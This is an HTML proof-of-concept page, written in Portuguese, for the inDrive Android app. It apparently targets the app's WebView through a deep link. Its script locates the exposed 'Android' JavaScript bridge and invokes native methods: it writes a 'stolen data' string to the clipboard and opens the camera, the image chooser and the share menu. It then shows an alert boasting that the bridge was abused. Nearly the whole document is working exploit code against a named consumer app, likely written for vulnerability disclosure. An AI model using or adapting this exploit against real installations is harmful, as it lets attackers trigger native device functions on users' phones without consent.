<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>inDrive - Bridge Exploitation PoC</title>
    <style>
        body { font-family: Arial; text-align: center; padding: 40px; background: #111; color: #0f0; }
        h1 { color: #f00; font-size: 28px; }
        .success { color: #0f0; font-size: 20px; margin: 20px 0; }
    </style>
</head>
<body>
    <h1>🚨 inDrive JavaScript Bridge Exploitation</h1>
    <p><strong>Página externa carregada dentro do WebView do inDrive via deep link</strong></p>

    <script>
        console.log("%c🔥 Explorando JavaScript Bridge - Interface: Android", "color:red; font-size:18px");

        const bridge = window.Android;

        if (bridge) {
            console.log("✅ Interface 'Android' encontrada!");

            try {
                bridge.copyToClipboard("Dados roubados via bridge do inDrive! - PoC Leonardo");
                console.log("✅ copyToClipboard() chamado");
            } catch(e) { console.log("copyToClipboard falhou"); }

            try {
                if (typeof bridge.openCamera === "function") {
                    bridge.openCamera();
                    console.log("✅ openCamera() chamado");
                }
            } catch(e) { console.log("openCamera falhou"); }

            try {
                if (typeof bridge.openImageChooser === "function") {
                    bridge.openImageChooser();
                    console.log("✅ openImageChooser() chamado");
                }
            } catch(e) { console.log("openImageChooser falhou"); }

            try {
                if (typeof bridge.openShareMenu === "function") {
                    bridge.openShareMenu();
                    console.log("✅ openShareMenu() chamado");
                }
            } catch(e) { console.log("openShareMenu falhou"); }

            alert("✅ SUCESSO TOTAL!\n\nJavaScript Bridge ABUSADO com sucesso!\n\nInterface: Android\nMétodos nativos chamados:\n• copyToClipboard\n• openCamera\n• openImageChooser\n• openShareMenu\n\nIsso prova o risco real de abuso dentro do app inDrive.");
            
            document.body.innerHTML += '<p class="success">🎉 MÉTODOS NATIVOS INVOCADOS COM SUCESSO!</p>';
        } else {
            alert("❌ Interface Android não encontrada.");
        }
    </script>
</body>
</html>
